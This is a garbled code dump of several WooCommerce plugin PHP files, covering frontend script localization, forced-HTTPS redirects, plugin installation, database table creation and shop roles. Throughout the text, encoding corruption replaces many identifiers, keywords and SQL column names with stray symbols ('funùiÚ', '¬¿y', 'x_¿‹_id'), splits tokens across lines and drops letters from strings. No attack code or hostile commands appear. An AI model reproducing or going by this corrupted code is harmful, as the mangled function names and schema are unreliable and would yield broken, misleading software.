Ğ'wc_ÿ¹_äagm’ts_·¿ms', 
	`¬¿y
(

150 'ajax_u¾' => 
	`WC
()->
	`ajax_u¾
(),

151 'äagm’t_Çme' => 
	`­¶y_f‹rs
( 'woocommerce_cart_fragment_name', 'wc_fragments' )

154 
	`wp_loÿlize_süt
Ğ'wc-add-to-ÿ¹', 'wc_add_to_ÿ¹_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_add_to_ÿ¹_·¿ms', 
	`¬¿y
(

155 'ajax_u¾' => 
	`WC
()->
	`ajax_u¾
(),

156 'ajax_lßd”_u¾' => 
	`­¶y_f‹rs
Ğ'woocomm”û_ajax_lßd”_u¾', 
$as£ts_·th
 . 'images/ajax-loader@2x.gif' ),

157 'i18n_v›w_ÿ¹' => 
	`esc_©Œ__
( 'View Cart', 'woocommerce' ),

158 'ÿ¹_u¾' => 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'cart' ) ),

159 'is_ÿ¹' => 
	`is_ÿ¹
(),

160 'ÿ¹_»dœeù_aá”_add' => 
	`g‘_İtiÚ
( 'woocommerce_cart_redirect_after_add' )

163 
	`wp_loÿlize_süt
Ğ'wc-add-to-ÿ¹-v¬ŸtiÚ', 'wc_add_to_ÿ¹_v¬ŸtiÚ_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_add_to_ÿ¹_v¬ŸtiÚ_·¿ms', 
	`¬¿y
(

164 'i18n_no_m©chšg_v¬ŸtiÚs_‹xt' => 
	`esc_©Œ__
( 'Sorry,‚o…roducts matched your selection. Please choose‡ different combination.', 'woocommerce' ),

165 'i18n_uÇvaabË_‹xt' => 
	`esc_©Œ__
( 'Sorry,his…roduct is unavailable. Please choose‡ different combination.', 'woocommerce' ),

168 
	`wp_loÿlize_süt
Ğ'wc-couÁry-£Ëù', 'wc_couÁry_£Ëù_·¿ms', 
	`­¶y_f‹rs
Ğ'wc_couÁry_£Ëù_·¿ms', 
	`¬¿y
(

169 'couÁr›s' => 
	`jsÚ_’code
Ğ
	`¬¿y_m”ge
Ğ
	`WC
()->
couÁr›s
->
	`g‘_®lowed_couÁry_¡©es
(), WC()->couÁr›s->
	`g‘_shpšg_couÁry_¡©es
() ) ),

170 'i18n_£Ëù_¡©e_‹xt' => 
	`esc_©Œ__
( 'Select‡n option&hellip;', 'woocommerce' ),

174 
$’queue_¡yËs
 = 
$this
->
	`g‘_¡yËs
();

176 iàĞ
$’queue_¡yËs
 )

177 
	`fÜ—ch
 ( 
$’queue_¡yËs
 
as
 
$hªdË
 => 
$¬gs
 )

178 
	`wp_’queue_¡yË
Ğ
$hªdË
, 
$¬gs
['src'], $args['deps'], $args['version'], $args['media'] );

179 
	}
}

190 
public
 
funùiÚ
 
	$check_jqu”y
() {

191 
glob®
 
$wp_süts
;

194 iàĞ! 
	`em±y
Ğ
$wp_süts
->
»gi¡”ed
['jqu”y']->
v”
 ) && !ƒm±yĞ$wp_süts->»gi¡”ed['jqu”y']->
¤c
 ) && 0 >ğ
	`v”siÚ_com·»
( $wp_scripts->registered['jquery']->ver, '1.8' ) ) {

195 
	`wp_d”egi¡”_süt
( 'jquery' );

196 
	`wp_»gi¡”_süt
Ğ'jqu”y', '/wp-šşudes/js/jqu”y/jqu”y.js', 
	`¬¿y
(), '1.8' );

197 
	`wp_’queue_süt
( 'jquery' );

199 
	}
}

206 
public
 
funùiÚ
 
	$backw¬ds_com·t
Ğ
$¡yËs
 ) {

207 iàĞ
	`defšed
( 'WOOCOMMERCE_USE_CSS' ) ) {

209 
	`_d•»ÿ‹d_funùiÚ
( 'WOOCOMMERCE_USE_CSS', '2.1', 'Styles should be„emoved using wp_deregister_style orhe woocommerce_enqueue_styles filter„atherhanhe WOOCOMMERCE_USE_CSS constant.' );

211 iàĞ! 
WOOCOMMERCE_USE_CSS
 )

212  
çl£
;

215  
$¡yËs
;

216 
	}
}

219 
Ãw
 
WC_FrÚ‹nd_Süts
();

	@includes/class-wc-https.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_HTTPS
 {

19 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

20 iàĞ'yes' =ğ
	`g‘_İtiÚ
( 'woocommerce_force_ssl_checkout' ) ) {

21 iàĞ! 
	`is_admš
(è|| ( 
	`defšed
Ğ'DOING_AJAX' ) && 
	`š_¬¿y
Ğ
$_REQUEST
['aùiÚ'], 
	`¬¿y
( 'woocommerce_get_refreshed_fragments', 'woocommerce_checkout', 'woocommerce_update_order_review', 'woocommerce_update_shipping_method', 'woocommerce_apply_coupon' ) ) ) ) {

23 
$f‹rs
 = 
	`¬¿y
( 'post_thumbnail_html', 'wp_get_attachment_url', 'wp_get_attachment_image_attributes', 'wp_get_attachment_url', 'option_stylesheet_url', 'option_template_url', 'script_loader_src', 'style_loader_src', 'template_directory_uri', 'stylesheet_directory_uri', 'site_url' );

25 
	`fÜ—ch
 ( 
$f‹rs
 
as
 
$f‹r
 ) {

26 
	`add_f‹r
Ğ
$f‹r
, 'WC_HTTPS::force_https_url' );

29 
	`add_f‹r
Ğ'·ge_lšk', 
	`¬¿y
Ğ
$this
, 'force_https_page_link' ), 10, 2 );

30 
	`add_aùiÚ
Ğ'‹m¶©e_»dœeù', 
	`¬¿y
Ğ
$this
, 'force_https_template_redirect' ) );

32 iàĞ
	`g‘_İtiÚ
('woocommerce_unforce_ssl_checkout') == 'yes' )

33 
	`add_aùiÚ
Ğ'‹m¶©e_»dœeù', 
	`¬¿y
Ğ
$this
, 'unforce_https_template_redirect' ) );

44 
public
 
funùiÚ
 
	$fÜû_h‰ps_u¾
Ğ
$cÚ‹Á
 ) {

45 iàĞ
	`is_s¦
() ) {

46 iàĞ
	`is_¬¿y
Ğ
$cÚ‹Á
 ) )

47 
$cÚ‹Á
 = 
	`¬¿y_m­
( 'WC_HTTPS::force_https_url', $content );

49 
$cÚ‹Á
 = 
	`¡r_»¶aû
( 'http:', 'https:', $content );

51  
$cÚ‹Á
;

52 
	}
}

61 
public
 
funùiÚ
 
	$fÜû_h‰ps_·ge_lšk
Ğ
$lšk
, 
$·ge_id
 ) {

62 iàĞ
	`š_¬¿y
Ğ
$·ge_id
, 
	`¬¿y
Ğ
	`g‘_İtiÚ
( 'woocommerce_checkout_page_id' ), get_option( 'woocommerce_myaccount_page_id' ) ) ) ) {

63 
$lšk
 = 
	`¡r_»¶aû
( 'http:', 'https:', $link );

64 } 
	`–£if
 ( 
	`g‘_İtiÚ
('woocommerce_unforce_ssl_checkout') == 'yes' ) {

65 
$lšk
 = 
	`¡r_»¶aû
( 'https:', 'http:', $link );

67  
$lšk
;

68 
	}
}

73 
public
 
funùiÚ
 
	$fÜû_h‰ps_‹m¶©e_»dœeù
() {

74 iàĞ! 
	`is_s¦
(è&& ( 
	`is_checkout
(è|| 
	`is_accouÁ_·ge
(è|| 
	`­¶y_f‹rs
Ğ'woocomm”û_fÜû_s¦_checkout', 
çl£
 ) ) ) {

76 iàĞ0 ==ğ
	`¡½os
Ğ
$_SERVER
['REQUEST_URI'], 'http' ) ) {

77 
	`wp_§ã_»dœeù
Ğ
	`´eg_»¶aû
Ğ'|^h‰p://|', 'h‰ps://', 
$_SERVER
['REQUEST_URI'] ) );

78 
ex™
;

80 
	`wp_§ã_»dœeù
Ğ'h‰ps://' . ( ! 
	`em±y
Ğ
$_SERVER
['HTTP_X_FORWARDED_HOST'] ) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : $_SERVER['HTTP_HOST'] ) . $_SERVER['REQUEST_URI'] );

81 
ex™
;

84 
	}
}

89 
public
 
funùiÚ
 
	$unfÜû_h‰ps_‹m¶©e_»dœeù
() {

90 iàĞ
	`is_s¦
(è&& 
$_SERVER
['REQUEST_URI'] && ! 
	`is_checkout
(è&& ! 
	`is_ajax
(è&& ! 
	`is_accouÁ_·ge
(è&& 
	`­¶y_f‹rs
Ğ'woocomm”û_unfÜû_s¦_checkout', 
Œue
 ) ) {

92 iàĞ0 ==ğ
	`¡½os
Ğ
$_SERVER
['REQUEST_URI'], 'http' ) ) {

93 
	`wp_§ã_»dœeù
Ğ
	`´eg_»¶aû
Ğ'|^h‰ps://|', 'h‰p://', 
$_SERVER
['REQUEST_URI'] ) );

94 
ex™
;

96 
	`wp_§ã_»dœeù
Ğ'h‰p://' . ( ! 
	`em±y
Ğ
$_SERVER
['HTTP_X_FORWARDED_HOST'] ) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : $_SERVER['HTTP_HOST'] ) . $_SERVER['REQUEST_URI'] );

97 
ex™
;

100 
	}
}

103 
Ãw
 
WC_HTTPS
();

	@includes/class-wc-install.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Install' ) ) :

18 şas 
	cWC_In¡®l
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`»gi¡”_aùiv©iÚ_hook
Ğ
WC_PLUGIN_FILE
, 
	`¬¿y
Ğ
$this
, 'install' ) );

26 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'install_actions' ) );

27 
	`add_aùiÚ
Ğ'admš_š™', 
	`¬¿y
Ğ
$this
, 'check_version' ), 5 );

28 
	`add_aùiÚ
Ğ'š_¶ugš_upd©e_mes§ge-woocomm”û/woocomm”û.php', 
	`¬¿y
Ğ
$this
, 'in_plugin_update_message' ) );

37 
public
 
funùiÚ
 
	$check_v”siÚ
() {

38 iàĞ! 
	`defšed
Ğ'IFRAME_REQUEST' ) && ( 
	`g‘_İtiÚ
Ğ'woocomm”û_v”siÚ' ) !ğ
	`WC
()->
v”siÚ
 || get_option( 'woocommerce_db_version' ) != WC()->version ) ) {

39 
$this
->
	`š¡®l
();

41 
	`do_aùiÚ
( 'woocommerce_updated' );

43 
	}
}

48 
public
 
funùiÚ
 
	$š¡®l_aùiÚs
() {

50 iàĞ! 
	`em±y
Ğ
$_GET
['install_woocommerce_pages'] ) ) {

52 
£lf
::
	`ü—‹_·ges
();

55 
	`d–‘e_İtiÚ
( '_wc_needs_pages' );

56 
	`d–‘e_Œªs›Á
( '_wc_activation_redirect' );

59 
	`wp_»dœeù
Ğ
	`admš_u¾
( 'index.php?page=wc-about&wc-installed=true' ) );

60 
ex™
;

63 } 
	`–£if
 ( ! 
	`em±y
Ğ
$_GET
['skip_install_woocommerce_pages'] ) ) {

66 
	`d–‘e_İtiÚ
( '_wc_needs_pages' );

67 
	`d–‘e_Œªs›Á
( '_wc_activation_redirect' );

70 
	`wp_»dœeù
Ğ
	`admš_u¾
( 'index.php?page=wc-about' ) );

71 
ex™
;

74 } 
	`–£if
 ( ! 
	`em±y
Ğ
$_GET
['do_update_woocommerce'] ) ) {

76 
$this
->
	`upd©e
();

79 
	`d–‘e_İtiÚ
( '_wc_needs_pages' );

80 
	`d–‘e_İtiÚ
( '_wc_needs_update' );

81 
	`d–‘e_Œªs›Á
( '_wc_activation_redirect' );

84 
	`wp_»dœeù
Ğ
	`admš_u¾
( 'index.php?page=wc-about&wc-updated=true' ) );

85 
ex™
;

87 
	}
}

92 
public
 
funùiÚ
 
	$š¡®l
() {

93 
$this
->
	`ü—‹_İtiÚs
();

94 
$this
->
	`ü—‹_bËs
();

95 
$this
->
	`ü—‹_rŞes
();

98 
	`šşude_Úû
( 'class-wc-post-types.php' );

99 
WC_Po¡_ty³s
::
	`»gi¡”_po¡_ty³s
();

100 
WC_Po¡_ty³s
::
	`»gi¡”_xÚom›s
();

103 
	`WC
()->
qu”y
->
	`š™_qu”y_v¬s
();

104 
	`WC
()->
qu”y
->
	`add_’dpošts
();

106 
$this
->
	`ü—‹_‹rms
();

107 
$this
->
	`ü—‹_üÚ_jobs
();

108 
$this
->
	`ü—‹_fes
();

109 
$this
->
	`ü—‹_css_äom_Ëss
();

112 
	`wc_d–‘e_´oduù_Œªs›Ás
();

115 
$cu¼’t_v”siÚ
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_v”siÚ', 
nuÎ
 );

116 
$cu¼’t_db_v”siÚ
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_db_v”siÚ', 
nuÎ
 );

118 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '2.1.0', '<' ) && 
nuÎ
 !== $current_db_version ) {

119 
	`upd©e_İtiÚ
( '_wc_needs_update', 1 );

121 
	`upd©e_İtiÚ
Ğ'woocomm”û_db_v”siÚ', 
	`WC
()->
v”siÚ
 );

125 
	`upd©e_İtiÚ
Ğ'woocomm”û_v”siÚ', 
	`WC
()->
v”siÚ
 );

128 iàĞ
	`wc_g‘_·ge_id
( 'shop' ) < 1 ) {

129 
	`upd©e_İtiÚ
( '_wc_needs_pages', 1 );

133 
	`æush_»wr™e_ruËs
();

136 
	`£t_Œªs›Á
( '_wc_activation_redirect', 1, 60 * 60 );

137 
	}
}

142 
public
 
funùiÚ
 
	$upd©e
() {

144 
$cu¼’t_db_v”siÚ
 = 
	`g‘_İtiÚ
( 'woocommerce_db_version' );

146 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '1.4', '<' ) ) {

147 
	`šşude
( 'updates/woocommerce-update-1.4.php' );

148 
	`upd©e_İtiÚ
( 'woocommerce_db_version', '1.4' );

151 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '1.5', '<' ) ) {

152 
	`šşude
( 'updates/woocommerce-update-1.5.php' );

153 
	`upd©e_İtiÚ
( 'woocommerce_db_version', '1.5' );

156 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '2.0', '<' ) ) {

157 
	`šşude
( 'updates/woocommerce-update-2.0.php' );

158 
	`upd©e_İtiÚ
( 'woocommerce_db_version', '2.0' );

161 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '2.0.9', '<' ) ) {

162 
	`šşude
( 'updates/woocommerce-update-2.0.9.php' );

163 
	`upd©e_İtiÚ
( 'woocommerce_db_version', '2.0.9' );

166 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '2.0.14', '<' ) ) {

167 iàĞ'HU' =ğ
	`g‘_İtiÚ
( 'woocommerce_default_country' ) ) {

168 
	`upd©e_İtiÚ
( 'woocommerce_default_country', 'HU:BU' );

171 
	`upd©e_İtiÚ
( 'woocommerce_db_version', '2.0.14' );

174 iàĞ
	`v”siÚ_com·»
Ğ
$cu¼’t_db_v”siÚ
, '2.1.0', '<' ) || 
WC_VERSION
 == '2.1-bleeding' ) {

175 
	`šşude
( 'updates/woocommerce-update-2.1.php' );

176 
	`upd©e_İtiÚ
( 'woocommerce_db_version', '2.1.0' );

179 
	`upd©e_İtiÚ
Ğ'woocomm”û_db_v”siÚ', 
	`WC
()->
v”siÚ
 );

180 
	}
}

185 
´iv©e
 
funùiÚ
 
	$ü—‹_üÚ_jobs
() {

187 
	`wp_ş—r_scheduËd_hook
( 'woocommerce_scheduled_sales' );

188 
	`wp_ş—r_scheduËd_hook
( 'woocommerce_cancel_unpaid_orders' );

189 
	`wp_ş—r_scheduËd_hook
( 'woocommerce_cleanup_sessions' );

191 
$ve
 = 
	`g‘_İtiÚ
( 'gmt_offset' ) > 0 ? '+' : '-';

193 
	`wp_scheduË_ev’t
Ğ
	`¡¹Ùime
Ğ'00:00omÜrow ' . 
$ve
 . 
	`g‘_İtiÚ
( 'gmt_offset' ) . ' HOURS' ), 'daily', 'woocommerce_scheduled_sales' );

195 
$h–d_du¿tiÚ
 = 
	`g‘_İtiÚ
Ğ'woocomm”û_hŞd_¡ock_mšu‹s', 
nuÎ
 );

197 iàĞ
	`is_nuÎ
Ğ
$h–d_du¿tiÚ
 ) ) {

198 
$h–d_du¿tiÚ
 = '60';

201 iàĞ
$h–d_du¿tiÚ
 != '' ) {

202 
	`wp_scheduË_sšgË_ev’t
Ğ
	`time
(è+ ( 
	`absšt
Ğ
$h–d_du¿tiÚ
 ) * 60 ), 'woocommerce_cancel_unpaid_orders' );

205 
	`wp_scheduË_ev’t
Ğ
	`time
(), 'twicedaily', 'woocommerce_cleanup_sessions' );

206 
	}
}

214 
public
 
funùiÚ
 
	$ü—‹_·ges
() {

215 
$·ges
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ü—‹_·ges', 
	`¬¿y
(

216 'shİ' => 
	`¬¿y
(

217 'Çme' => 
	`_x
( 'shop', 'Page slug', 'woocommerce' ),

218 't™Ë' => 
	`_x
( 'Shop', 'Pageitle', 'woocommerce' ),

221 'ÿ¹' => 
	`¬¿y
(

222 'Çme' => 
	`_x
( 'cart', 'Page slug', 'woocommerce' ),

223 't™Ë' => 
	`_x
( 'Cart', 'Pageitle', 'woocommerce' ),

224 'cÚ‹Á' => '[' . 
	`­¶y_f‹rs
( 'woocommerce_cart_shortcode_tag', 'woocommerce_cart' ) . ']'

226 'checkout' => 
	`¬¿y
(

227 'Çme' => 
	`_x
( 'checkout', 'Paeg slug', 'woocommerce' ),

228 't™Ë' => 
	`_x
( 'Checkout', 'Pageitle', 'woocommerce' ),

229 'cÚ‹Á' => '[' . 
	`­¶y_f‹rs
( 'woocommerce_checkout_shortcode_tag', 'woocommerce_checkout' ) . ']'

231 'myaccouÁ' => 
	`¬¿y
(

232 'Çme' => 
	`_x
( 'my-account', 'Page slug', 'woocommerce' ),

233 't™Ë' => 
	`_x
( 'My Account', 'Pageitle', 'woocommerce' ),

234 'cÚ‹Á' => '[' . 
	`­¶y_f‹rs
( 'woocommerce_my_account_shortcode_tag', 'woocommerce_my_account' ) . ']'

238 
	`fÜ—ch
 ( 
$·ges
 
as
 
$key
 => 
$·ge
 ) {

239 
	`wc_ü—‹_·ge
Ğ
	`esc_sql
Ğ
$·ge
['Çme'] ), 'woocomm”û_' . 
$key
 . '_·ge_id', $·ge['t™Ë'], $·ge['cÚ‹Á'], ! 
	`em±y
Ğ$·ge['·»Á'] ) ? 
	`wc_g‘_·ge_id
( $page['parent'] ) : '' );

241 
	}
}

249 
´iv©e
 
funùiÚ
 
	$ü—‹_‹rms
() {

251 
$xÚom›s
 = 
	`¬¿y
(

252 '´oduù_ty³' => 
	`¬¿y
(

258 'shİ_Üd”_¡©us' => 
	`¬¿y
(

269 
	`fÜ—ch
 ( 
$xÚom›s
 
as
 
$xÚomy
 => 
$‹rms
 ) {

270 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

271 iàĞ! 
	`g‘_‹rm_by
Ğ'¦ug', 
	`§n™ize_t™Ë
Ğ
$‹rm
 ), 
$xÚomy
 ) ) {

272 
	`wp_š£¹_‹rm
Ğ
$‹rm
, 
$xÚomy
 );

276 
	}
}

285 
funùiÚ
 
	$ü—‹_İtiÚs
() {

287 
	`šşude_Úû
( 'admin/class-wc-admin-settings.php' );

289 
$£‰šgs
 = 
WC_Admš_S‘tšgs
::
	`g‘_£‰šgs_·ges
();

291 
	`fÜ—ch
 ( 
$£‰šgs
 
as
 
$£ùiÚ
 ) {

292 
	`fÜ—ch
 ( 
$£ùiÚ
->
	`g‘_£‰šgs
(è
as
 
$v®ue
 ) {

293 iàĞ
	`is£t
Ğ
$v®ue
['default'] ) && isset( $value['id'] ) ) {

294 
$autŞßd
 = 
	`is£t
Ğ
$v®ue
['autŞßd'] ) ? (
boŞ
è$v®ue['autŞßd'] : 
Œue
;

295 
	`add_İtiÚ
Ğ
$v®ue
['id'], $v®ue['deçuÉ'], '', ( 
$autŞßd
 ? 'yes' : 'no' ) );

300 iàĞ
$£ùiÚ
 
š¡ªûof
 
WC_S‘tšgs_Produùs
 ) {

301 
	`fÜ—ch
 ( 
$£ùiÚ
->
	`g‘_£‰šgs
Ğ'šv’tÜy' ) 
as
 
$v®ue
 ) {

302 iàĞ
	`is£t
Ğ
$v®ue
['default'] ) && isset( $value['id'] ) ) {

303 
$autŞßd
 = 
	`is£t
Ğ
$v®ue
['autŞßd'] ) ? (
boŞ
è$v®ue['autŞßd'] : 
Œue
;

304 
	`add_İtiÚ
Ğ
$v®ue
['id'], $v®ue['deçuÉ'], '', ( 
$autŞßd
 ? 'yes' : 'no' ) );

309 
	}
}

327 
´iv©e
 
funùiÚ
 
	$ü—‹_bËs
() {

328 
glob®
 
$wpdb
, 
$woocomm”û
;

330 
$wpdb
->
	`hide_”rÜs
();

332 
$cŞÏ‹
 = '';

334 iàĞ
$wpdb
->
	`has_ÿp
( 'collation' ) ) {

335 iàĞ! 
	`em±y
(
$wpdb
->
ch¬£t
 ) ) {

336 
$cŞÏ‹
 .= "DEFAULT CHARACTER SET $wpdb->charset";

338 iàĞ! 
	`em±y
(
$wpdb
->
cŞÏ‹
 ) ) {

339 
$cŞÏ‹
 .= " COLLATE $wpdb->collate";

343 
	`»quœe_Úû
Ğ
ABSPATH
 . 'wp-admin/includes/upgrade.php' );

350 iàĞ
$wpdb
->
	`g‘_v¬
( "SHOW TABLES LIKE '{$wpdb->prefix}woocommerce_downloadable_product_permissions';" ) ) {

351 iàĞ! 
$wpdb
->
	`g‘_v¬
( "SHOW COLUMNS FROM `{$wpdb->prefix}woocommerce_downloadable_product_permissions` LIKE 'permission_id';" ) ) {

352 
$wpdb
->
	`qu”y
( "ALTER TABLE {$wpdb->prefix}woocommerce_downloadable_product_permissions DROP PRIMARY KEY, ADD `permission_id` bigint(20) NOT NULL PRIMARY KEY AUTO_INCREMENT;" );

357 
$woocomm”û_bËs
 = "

358 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_©Œibu‹_xÚom›s
 (

359 
©Œibu‹_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

360 
©Œibu‹_Çme
 
	`v¬ch¬
(200è
NOT
 
NULL
,

361 
©Œibu‹_Ïb–
 
lÚg‹xt
 
NULL
,

362 
©Œibu‹_ty³
 
	`v¬ch¬
(200è
NOT
 
NULL
,

363 
©Œibu‹_Üd”by
 
	`v¬ch¬
(200è
NOT
 
NULL
,

364 
PRIMARY
 
	`KEY
 (
©Œibu‹_id
),

365 
KEY
 
	`©Œibu‹_Çme
 (
©Œibu‹_Çme
)

366 è
$cŞÏ‹
;

367 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_‹rmm‘a
 (

368 
m‘a_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

369 
woocomm”û_‹rm_id
 
	`bigšt
(20è
NOT
 
NULL
,

370 
m‘a_key
 
	`v¬ch¬
(255è
NULL
,

371 
m‘a_v®ue
 
lÚg‹xt
 
NULL
,

372 
PRIMARY
 
	`KEY
 (
m‘a_id
),

373 
KEY
 
	`woocomm”û_‹rm_id
 (
woocomm”û_‹rm_id
),

374 
KEY
 
	`m‘a_key
 (
m‘a_key
)

375 è
$cŞÏ‹
;

376 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_dowÆßdabË_´oduù_³rmissiÚs
 (

377 
³rmissiÚ_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

378 
dowÆßd_id
 
	`v¬ch¬
(32è
NOT
 
NULL
,

379 
´oduù_id
 
	`bigšt
(20è
NOT
 
NULL
,

380 
Üd”_id
 
	`bigšt
(20è
NOT
 
NULL
 
DEFAULT
 0,

381 
Üd”_key
 
	`v¬ch¬
(200è
NOT
 
NULL
,

382 
u£r_ema
 
	`v¬ch¬
(200è
NOT
 
NULL
,

383 
u£r_id
 
	`bigšt
(20è
NULL
,

384 
dowÆßds_»maššg
 
	`v¬ch¬
(9è
NULL
,

385 
acûss_g¿Áed
 
d©‘ime
 
NOT
 
NULL
  '0000-00-00 00:00:00',

386 
acûss_expœes
 
d©‘ime
 
NULL
  
nuÎ
,

387 
dowÆßd_couÁ
 
	`bigšt
(20è
NOT
 
NULL
 
DEFAULT
 0,

388 
PRIMARY
 
	`KEY
 (
³rmissiÚ_id
),

389 
KEY
 
	`dowÆßd_Üd”_key_´oduù
 (
´oduù_id
,
Üd”_id
,
Üd”_key
,
dowÆßd_id
),

390 
KEY
 
	`dowÆßd_Üd”_´oduù
 (
dowÆßd_id
,
Üd”_id
,
´oduù_id
)

391 è
$cŞÏ‹
;

392 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_Üd”_™ems
 (

393 
Üd”_™em_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

394 
Üd”_™em_Çme
 
lÚg‹xt
 
NOT
 
NULL
,

395 
Üd”_™em_ty³
 
	`v¬ch¬
(200è
NOT
 
NULL
 
DEFAULT
 '',

396 
Üd”_id
 
	`bigšt
(20è
NOT
 
NULL
,

397 
PRIMARY
 
	`KEY
 (
Üd”_™em_id
),

398 
KEY
 
	`Üd”_id
 (
Üd”_id
)

399 è
$cŞÏ‹
;

400 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_Üd”_™emm‘a
 (

401 
m‘a_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

402 
Üd”_™em_id
 
	`bigšt
(20è
NOT
 
NULL
,

403 
m‘a_key
 
	`v¬ch¬
(255è
NULL
,

404 
m‘a_v®ue
 
lÚg‹xt
 
NULL
,

405 
PRIMARY
 
	`KEY
 (
m‘a_id
),

406 
KEY
 
	`Üd”_™em_id
 (
Üd”_™em_id
),

407 
KEY
 
	`m‘a_key
 (
m‘a_key
)

408 è
$cŞÏ‹
;

409 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_x_¿‹s
 (

410 
x_¿‹_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

411 
x_¿‹_couÁry
 
	`v¬ch¬
(200è
NOT
 
NULL
 
DEFAULT
 '',

412 
x_¿‹_¡©e
 
	`v¬ch¬
(200è
NOT
 
NULL
 
DEFAULT
 '',

413 
x_¿‹
 
	`v¬ch¬
(200è
NOT
 
NULL
 
DEFAULT
 '',

414 
x_¿‹_Çme
 
	`v¬ch¬
(200è
NOT
 
NULL
 
DEFAULT
 '',

415 
x_¿‹_´iÜ™y
 
	`bigšt
(20è
NOT
 
NULL
,

416 
x_¿‹_compound
 (1è
NOT
 
NULL
 
DEFAULT
 0,

417 
x_¿‹_shpšg
 (1è
NOT
 
NULL
 
DEFAULT
 1,

418 
x_¿‹_Üd”
 
	`bigšt
(20è
NOT
 
NULL
,

419 
x_¿‹_şass
 
	`v¬ch¬
(200è
NOT
 
NULL
 
DEFAULT
 '',

420 
PRIMARY
 
	`KEY
 (
x_¿‹_id
),

421 
KEY
 
	`x_¿‹_couÁry
 (
x_¿‹_couÁry
),

422 
KEY
 
	`x_¿‹_¡©e
 (
x_¿‹_¡©e
),

423 
KEY
 
	`x_¿‹_şass
 (
x_¿‹_şass
),

424 
KEY
 
	`x_¿‹_´iÜ™y
 (
x_¿‹_´iÜ™y
)

425 è
$cŞÏ‹
;

426 
CREATE
 
TABLE
 {
$wpdb
->
´efix
}
	`woocomm”û_x_¿‹_loÿtiÚs
 (

427 
loÿtiÚ_id
 
	`bigšt
(20è
NOT
 
NULL
 
auto_šüem’t
,

428 
loÿtiÚ_code
 
	`v¬ch¬
(255è
NOT
 
NULL
,

429 
x_¿‹_id
 
	`bigšt
(20è
NOT
 
NULL
,

430 
loÿtiÚ_ty³
 
	`v¬ch¬
(40è
NOT
 
NULL
,

431 
PRIMARY
 
	`KEY
 (
loÿtiÚ_id
),

432 
KEY
 
	`x_¿‹_id
 (
x_¿‹_id
),

433 
KEY
 
	`loÿtiÚ_ty³
 (
loÿtiÚ_ty³
),

434 
KEY
 
	`loÿtiÚ_ty³_code
 (
loÿtiÚ_ty³
,
loÿtiÚ_code
)

435 è
$cŞÏ‹
;

437 
	`dbD–
Ğ
$woocomm”û_bËs
 );

438 
	}
}

443 
public
 
funùiÚ
 
	$ü—‹_rŞes
() {

444 
glob®
 
$wp_rŞes
;

446 iàĞ
	`şass_exi¡s
( 'WP_Roles' ) ) {

447 iàĞ! 
	`is£t
Ğ
$wp_rŞes
 ) ) {

448 
$wp_rŞes
 = 
Ãw
 
	`WP_RŞes
();

452 iàĞ
	`is_objeù
Ğ
$wp_rŞes
 ) ) {

455 
	`add_rŞe
Ğ'cu¡om”', 
	`__
Ğ'Cu¡om”', 'woocomm”û' ), 
	`¬¿y
(

456 '»ad' => 
Œue
,

457 'ed™_po¡s' => 
çl£
,

458 'd–‘e_po¡s' => 
çl£


462 
	`add_rŞe
Ğ'shİ_mªag”', 
	`__
Ğ'Shİ Mªag”', 'woocomm”û' ), 
	`¬¿y
(

463 'Ëv–_9' => 
Œue
,

464 'Ëv–_8' => 
Œue
,

465 'Ëv–_7' => 
Œue
,

466 'Ëv–_6' => 
Œue
,

467 'Ëv–_5' => 
Œue
,

468 'Ëv–_4' => 
Œue
,

469 'Ëv–_3' => 
Œue
,

470 'Ëv–_2' => 
Œue
,

471 'Ëv–_1' => 
Œue
,

472 'Ëv–_0' => 
Œue
,

473 '»ad' => 
Œue
,

474 '»ad_´iv©e_·ges' => 
Œue
,

475 '»ad_´iv©e_po¡s' => 
Œue
,

476 'ed™_u£rs' => 
Œue
,

477 'ed™_po¡s' => 
Œue
,

478 'ed™_·ges' => 
Œue
,

479 'ed™_published_po¡s' => 
Œue
,

480 'ed™_published_·ges' => 
Œue
,

481 'ed™_´iv©e_·ges' => 
Œue
,

482 'ed™_´iv©e_po¡s' => 
Œue
,

483 'ed™_Ùh”s_po¡s' => 
Œue
,

484 'ed™_Ùh”s_·ges' => 
Œue
,

485 'publish_po¡s' => 
Œue
,

486 'publish_·ges' => 
Œue
,

487 'd–‘e_po¡s' => 
Œue
,

